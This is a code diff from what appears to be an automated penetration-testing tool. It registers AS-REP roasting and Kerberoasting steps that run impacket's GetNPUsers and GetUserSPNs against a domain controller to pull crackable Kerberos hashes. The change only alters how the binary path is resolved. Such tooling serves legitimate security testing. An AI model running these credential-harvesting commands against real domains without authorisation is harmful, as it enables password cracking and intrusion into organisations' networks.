@@ -45,7 +45,7 @@ register(Step(
     id="asrep_impacket", name="impacket GetNPUsers — AS-REP roast (fallback)",
     category="Kerberos", phase=2, tool="impacket-GetNPUsers",
     requires=[HAS_DOMAIN, HAS_USERS],
-    build_cmd=lambda c: ["impacket-GetNPUsers", f"{c.domain}/",
+    build_cmd=lambda c: [c.bin("impacket-GetNPUsers"), f"{c.domain}/",
                          "-usersfile", str(c.target_dir / "users.txt"),
                          "-dc-ip", c.target, "-format", "hashcat", "-no-pass"],
     save_name="asrep_impacket.txt", parse=_asrep,
@@ -65,7 +65,7 @@ register(Step(
     id="kerberoast_impacket", name="impacket GetUserSPNs — Kerberoast (fallback)",
     category="Kerberos", phase=2, tool="impacket-GetUserSPNs",
     requires=[HAS_DOMAIN, HAS_CREDS],
-    build_cmd=lambda c: (["impacket-GetUserSPNs", "-dc-ip", c.target, "-request",
+    build_cmd=lambda c: ([c.bin("impacket-GetUserSPNs"), "-dc-ip", c.target, "-request",
                           c.impacket_target().split("@")[0]]
                          if c.username and c.password is not None else None),
     save_name="kerberoast_impacket.txt", parse=_kerberoast,
